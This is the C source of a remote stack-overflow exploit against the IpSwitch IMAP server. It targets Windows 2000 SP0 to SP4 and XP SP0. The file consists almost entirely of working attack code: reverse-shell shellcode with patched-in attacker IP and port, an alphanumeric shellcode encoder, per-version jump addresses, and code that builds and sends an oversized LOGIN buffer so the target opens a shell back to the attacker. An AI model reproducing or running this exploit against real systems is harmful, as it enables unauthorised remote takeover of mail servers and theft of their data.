#include <stdio.h>
#include <string.h>
#include <winsock.h>
#pragma comment(lib,"ws2_32")

void cmdshell (int sock);
long gimmeip(char *hostname);
char buffer[2500];

//special stuff
char* alphaEncodeShellcode(char *shellcode, int size);
// un-crypted shellcode that we'll fill our retn values, then encode.
char unEncShellcode[]=
"\xfc\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24\x8b\x45"
"\x3c\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01\xeb\x49"
"\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca\x0d"
"\x01\xc2\xeb\xf4\x3b\x54\x24\x28\x75\xe5\x8b\x5f\x24\x01\xeb\x66"
"\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb\x03\x2c\x8b\x89\x6c\x24\x1c\x61"
"\xc3\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x40"
"\x08\x5e\x68\x8e\x4e\x0e\xec\x50\xff\xd6\x66\x53\x66\x68\x33\x32"
"\x68\x77\x73\x32\x5f\x54\xff\xd0\x68\xcb\xed\xfc\x3b\x50\xff\xd6"
"\x5f\x89\xe5\x66\x81\xed\x08\x02\x55\x6a\x02\xff\xd0\x68\xd9\x09"
"\xf5\xad\x57\xff\xd6\x53\x53\x53\x53\x43\x53\x43\x53\xff\xd0\x68"
//160 above, ip next 4 bytes then, pass 2 theres port
"\x64\x64\x64\x64\x66\x68\x0d\x05\x66\x53\x89\xe1\x95\x68\xec\xf9"
"\xaa\x60\x57\xff\xd6\x6a\x10\x51\x55\xff\xd0\x66\x6a\x64\x66\x68"
"\x63\x6d\x6a\x50\x59\x29\xcc\x89\xe7\x6a\x44\x89\xe2\x31\xc0\xf3"
"\xaa\x95\x89\xfd\xfe\x42\x2d\xfe\x42\x2c\x8d\x7a\x38\xab\xab\xab"
"\x68\x72\xfe\xb3\x16\xff\x75\x28\xff\xd6\x5b\x57\x52\x51\x51\x51"
"\x6a\x01\x51\x51\x55\x51\xff\xd0\x68\xad\xd9\x05\xce\x53\xff\xd6"
"\x6a\xff\xff\x37\xff\xd0\x68\xe7\x79\xc6\x79\xff\x75\x04\xff\xd6"
"\xff\x77\xfc\xff\xd0\x68\xef\xce\xe0\x60\x53\xff\xd6\xff\xd0";

//modified encoded alpha num SUB ECX, 2E8 JMP ECX
char jmpBack[]=
"VTX630VXH49HHHPhYAAQhZYYYYAAQQDDDd36FFFFTXVj0PPTUPPa301089"
"IIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIoqYyKHTB30WpyoKQAPA";
int paddingSize; // change when changing shellcode. 676 bytes - shellcodesize = this.
char jmp2KSP4[] = "\x40\x43\x44\x78"; //JMP EBX 2000 SP4 TESTED
char jmp2KSP3[] = "\x40\x23\x44\x78"; //JMP EBX 2000 SP3
char jmp2KSP2[] = "\x40\x21\x46\x78"; //JMP EBX 2000 SP2
char jmp2KSP1[] = "\x62\x54\x30\x77"; //POP POP RETN 2000 SP1 (no jmp ebx)
char jmp2KSP0[] = "\x6C\x30\x6B\x77"; //JMP EBX 2000 SP0
char jmpXPSP0[] = "\x63\x4F\x60\x77"; //JMP EBX WinXP SP0 no SEH XOR prot so JMP EBX is ok

int main(int argc,char *argv[])
{
                WSADATA wsaData;
                struct sockaddr_in targetTCP;
                int sockTCP;
                unsigned short port = 143;
                long ip;
                if(argc < 5)
                {
                        printf("IpSwitch IMAP server Remote Stack Overflow.\n"
                                "This exploit uses a reverse shell payload.\n"
                                "Usage: %s [retnaddr] [retport] [target] [address] <port_to_exploit>\n"
                                " eg: %s 192.168.1.94 1564 2 192.168.1.95\n"
                                "Targets:\n"
                                "1. Windows XP SP 0.\n2. Windows 2000 SP4\n3. Windows 2000 SP3\n"
                                "4. Windows 2000 SP2\n5. Windows 2000 SP1\n6. Windows 2000 SP0\n"
                                "Read comments in source code for more info.\n"
                                "Coded by nolimit@CiSO and BuzzDee.\n",argv[0],argv[0]);
                        return 1;
                }
                if(argc==6)
                        port = atoi(argv[5]);
                WSAStartup(0x0202, &wsaData);
                printf("[*] Target:\t%s \tPort: %d\n\n",argv[4],port);
                ip=gimmeip(argv[4]);
                targetTCP.sin_family = AF_INET;
                targetTCP.sin_addr.s_addr = ip;
                targetTCP.sin_port = htons(port);
                //set ip/port specified. Probably could have done this easier, but whatever.
                unsigned long revIp = gimmeip(argv[1]);
                unsigned long *revPtr = (unsigned long *)&unEncShellcode;
                revPtr = revPtr + (160/4); //go to ip place, it adds by 4, and it's 160 bytes away.
                *revPtr = revIp;
                char *portPtr = (char *)revPtr + 6; //ptr + 2 bytes past
                int rPort = atoi(argv[2]);
                char *revPortPtr = (char *)&rPort;
                memcpy(portPtr,revPortPtr+1,1);
                memcpy(portPtr+1,revPortPtr,1);
                //done formatting, now lets encode it.
                char *shellcode = alphaEncodeShellcode(unEncShellcode,sizeof(unEncShellcode));
                paddingSize = 676 - strlen(shellcode);
                //form buffer here.
                memset(buffer,'\x00',2500);
                strcpy(buffer,"A001 LOGIN user@");
                memset(buffer+16,'\x41',paddingSize); //INC ECX nopslide
                strcat(buffer,shellcode);
                strcat(buffer,"r!s!"); //jmp over SE handler
                switch(atoi(argv[3]))
                {
                        case 1:
                        printf("[*] Targetting Windows XP SP 0..\n");
                        strcat(buffer,jmpXPSP0);
                        break;
                        case 2:
                        printf("[*] Targetting Windows 2000 SP4..\n");
                        strcat(buffer,jmp2KSP4);
                        break;
                        case 3:
                        printf("[*] Targetting Windows 2000 SP3..\n");
                        strcat(buffer,jmp2KSP3);
                        break;
                        case 4:
                        printf("[*] Targetting Windows 2000 SP2..\n");
                        strcat(buffer,jmp2KSP2);
                        break;
                        case 5:
                        printf("[*] Targetting Windows 2000 SP1..\n");
                        strcat(buffer,jmp2KSP1);
                        break;
                        case 6:
                        printf("[*] Targetting Windows 2000 SP0..\n");
                        strcat(buffer,jmp2KSP0);
                        break;
                        default:
                        printf("Target error.\n");
                        return 1;
                        break;
                }
                memset(buffer+strlen(buffer),'\x41',29);
                strcat(buffer,jmpBack); //decodes to jmp back to top part of buffer
                memset(buffer+strlen(buffer),'\x41',1323);
                strcat(buffer," nolimits\r\n");
                //buffer formed
                if ((sockTCP = socket(AF_INET, SOCK_STREAM, 0)) == -1)
                {
                                printf("[x] Socket not initialized! Exiting...\n");
                                WSACleanup();
                return 1;
                }
                printf("[*] Socket initialized...\n");
                if(connect(sockTCP,(struct sockaddr *)&targetTCP, sizeof(targetTCP)) != 0)
                {
                        printf("[*] Connection to host failed! Exiting...\n");
                        WSACleanup();
                        exit(1);
                }
                printf("[*] Sending  buffer.\n");
                Sleep(1000);
                if (send(sockTCP, buffer, strlen(buffer),0) == -1)
                {
                                printf("[x] Failed to inject packet! Exiting...\n");
                                WSACleanup();
                return 1;
                }
                Sleep(1000);
                closesocket(sockTCP);
                WSACleanup();
                printf("Exploit sent. Reverse Shell should be comming if everyhing worked.\n");
                return 0;
}

/*********************************************************************************/
long gimmeip(char *hostname)
{
        struct hostent *he;
        long ipaddr;

        if ((ipaddr = inet_addr(hostname)) < 0)
        {
                if ((he = gethostbyname(hostname)) == NULL)
                {
                        printf("[x] Failed to resolve host: %s! Exiting...\n\n",hostname);
                        WSACleanup();
                        exit(1);
                }
                memcpy(&ipaddr, he->h_addr, he->h_length);
        }
        return ipaddr;
}
/*********************************************************************************/

//Below here, all code is modified code from ALPHA 2: Zero-tolerance by Berend-Jan Wever.
//  aka Skylined  <skylined@edup.tudelft.nl>. Hats off to him.

//ecx ascii decoder.
#define ecx_mixedcase_ascii_decoder     "IIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI"
// shellcode ptr & size
char* alphaEncodeShellcode(char *shellcode, int size)
{
        int   i, input, A, B, C, D, E, F;
        char* valid_chars="0123456789BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
        //first, create a big enough shellcode memory section
        char *encShellcode = (char *) malloc(sizeof((ecx_mixedcase_ascii_decoder) + (size * 2)));
        strcpy(encShellcode,ecx_mixedcase_ascii_decoder);
        char buff[4];
        int z=0;
        for(;z < size;z++)
        {
                 // encoding AB -> CD 00 EF 00
                A = (shellcode[z] & 0xf0) >> 4;
                B = (shellcode[z] & 0x0f);

                F = B;
                // E is arbitrary as long as EF is a valid character
                i = rand() % strlen(valid_chars);
                while ((valid_chars[i] & 0x0f) != F) { i = ++i % strlen(valid_chars); }
                E = valid_chars[i] >> 4;
                // normal code uses xor, unicode-proof uses ADD.
                // AB ->
                D =  0 ? (A-E) & 0x0f : (A^E);
                // C is arbitrary as long as CD is a valid character
                i = rand() % strlen(valid_chars);
                while ((valid_chars[i] & 0x0f) != D) { i = ++i % strlen(valid_chars); }
                C = valid_chars[i] >> 4;
                //edit, use curChar ptr to strncpy it.
                //printf("%c%c", (C<<4)+D, (E<<4)+F);
                sprintf(buff,"%c%c",(C<<4)+D, (E<<4)+F);
                strcat(encShellcode,buff);
        }
        return encShellcode;
}

